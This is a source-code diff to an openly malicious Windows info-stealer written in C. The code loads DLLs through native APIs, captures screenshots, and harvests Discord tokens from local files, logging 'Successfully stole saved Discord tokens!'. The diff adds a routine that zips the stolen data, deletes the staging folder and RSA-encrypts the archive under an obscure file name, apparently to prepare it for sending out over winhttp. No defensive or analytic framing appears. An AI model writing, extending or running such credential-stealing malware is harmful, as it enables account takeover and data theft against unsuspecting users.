@@ -7,6 +7,7 @@
 #include "./../../include/global.h"
 #include "./../../include/crypto.h"
 #include "./../../include/browsers.h"
+#include "./../../include/extra.h"
 
 // Function pointers for dynamically loading and managing DLLs and procedures
 NtLdrLoadDll LoadLib = NULL;
@@ -259,11 +260,7 @@ int Screenshot(const char *folder) {
     
     // Dynamically load the GDI32.dll library using LoadLib
     NTSTATUS status = LoadLib(NULL, &dllCharacteristics, &dllName, &hGdi32);
-    if (!NT_SUCCESS(status))
-    {
-        // If the DLL couldn't be loaded, return an error
-        return 1;
-    }
+    if (!NT_SUCCESS(status)) { return 1; }
     
     // Get function pointers for the required GDI32 functions
     pfnCreateCompatibleDC = (PFNCreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
@@ -581,7 +578,6 @@ int AccountTokens(char *temp, char *userf) {
     
     char PreviousFilename[MAX_PATH - 5]; // Store the previous file name to avoid processing the same file.
     char FileFullPath[MAX_PATH]; // Buffer to hold the full path of each file.
-    
     // Variables for file searching.
     HANDLE hFileFind;
     WIN32_FIND_DATAA FirstFile, NextFile;
@@ -596,13 +592,11 @@ int AccountTokens(char *temp, char *userf) {
     // Process the first file found.
     sprintf(FileFullPath, "%.*s%s", (int)(strlen(path) - 1), path, FirstFile.cFileName); // Build the full path for the first file.
     Discord(FileFullPath, DiscordTokens, &DiscordTokensLength); // Call the Discord function to extract tokens from the file.
-
     // Continue searching for the next files in the directory.
     while (TRUE)
     {
         // Find the next file in the directory.
         FindNextFileA(hFileFind, &NextFile);
-        
         // Check if the current file matches the previous file to avoid processing it again.
         if (!strcmp(PreviousFilename, NextFile.cFileName))
         {
@@ -618,7 +612,7 @@ int AccountTokens(char *temp, char *userf) {
     }
 
     // Log a success message once all files have been processed.
-    OKAY("Successfully stole saved Discord tokens! Saved to %s", output);
+    OKAY("Successfully stole saved Discord tokens! Saved to %s\n", output);
 
     // Print out each of the found Discord tokens.
     for (int i = 0; i < 10; i++) {
@@ -627,6 +621,7 @@ int AccountTokens(char *temp, char *userf) {
             // Write to file tokens.
             FILE *file = fopen(output, "w");
             fprintf(file, "Discord Token: %s\n", DiscordTokens[i]);
+            fclose(file);
         }
     }
 
@@ -854,7 +849,38 @@ int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLen
 
     return 0; // Return success.
 }
+int CompressAndEncryptData(char *temp, char *currentuser) {
+    // Zip files.
+    int index = 0;
+    char Files[20][MAX_PATH] = {0};
+    SubfolderFileFinder(Files, temp, &index);
+    const WCHAR *files[20];
+    char zipPath[MAX_PATH];
+    sprintf(zipPath, "%s\\AppData\\Local\\Temp", currentuser);
+    int size = MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, NULL, 0);
+    WCHAR *ZipOutput = (WCHAR *)malloc(size * sizeof(WCHAR));
+    MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, ZipOutput, size);
+    for (int i = 0; i < index; i++) { int size = MultiByteToWideChar(CP_UTF8, 0, Files[i], -1, NULL, 0); files[i] = (WCHAR *)malloc(size * sizeof(WCHAR)); MultiByteToWideChar(CP_UTF8, 0, Files[i], -1, (LPWSTR)files[i], size); }
+    CompressFile(files, index, ZipOutput);
+    for (int i = 0; i < index; i++) { free((void *)files[i]); } // Free memory.
+    free(ZipOutput);                                            // Free memory.
 
+    OKAY("Zipped stolen data.\n");
+
+    // Remove old folder
+    remove_directory(temp);
+    OKAY("Removed data storage folder\n");
+
+    // RSA encrypt the ZIP file.
+    char BizPath[MAX_PATH];
+    sprintf(BizPath, "%s\\BIZ.zip", zipPath);
+    char BizEncPath[MAX_PATH];
+    sprintf(BizEncPath, "%s\\FUM6204545345.enc", zipPath);
+    if (RSAEncrypt(BizPath, BizEncPath) != 0) { WARN("Error in RSA encrypting the ZIP file!"); return 1; }
+    OKAY("RSA Encrypted the zip file and output it to %s !", BizEncPath);
+    return 0;
+
+}
 
 
 
@@ -919,8 +945,10 @@ int main() {
     // In progress.
 
 
-    // Encrypt or ZIP the folder with the stolen data using a RSA public key.
-    // In progress.
+    // ZIP + AES Encrypt + RSA Encrypt the stolen data.
+    CompressAndEncryptData(temp, currentuser);
+
+
 
 
     // Load the winhttp.dll functions with NtAPI versions of LoadLibrary and GetProcAddress.
